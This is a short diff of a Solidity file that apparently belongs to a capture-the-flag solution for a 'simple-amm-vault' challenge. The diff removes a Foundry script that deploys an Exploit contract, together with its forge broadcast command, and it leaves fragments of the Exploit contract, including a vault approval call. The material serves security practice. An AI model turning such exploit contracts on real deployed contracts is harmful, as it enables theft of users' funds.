@@ -1,21 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.13;
+pragma solidity 0.8.15;
 
-import {Script, console2} from "forge-std/Script.sol";
-import {Setup} from "src/simple-amm-vault/Setup.sol";
-
-contract Solution is Script {
-    Setup setup = Setup(0x9303d86B193825658E59e7c740fe73478f44BB58);
-
-    function run() public {
-        vm.startBroadcast();
-
-        Exploit e = new Exploit(setup);
-        e.solve();
-
-        vm.stopBroadcast();
-    }
-}
+import { Setup } from "./Setup.sol";
 
 contract Exploit {
     Setup setup;
@@ -53,5 +39,3 @@ contract Exploit {
         setup.vault().approve(address(setup.amm()), svAmount);
     }
 }
-
-// forge script script/SimpleAMMVault.s.sol:Solution --rpc-url <rpc_url> --private-key <private_key> --broadcast
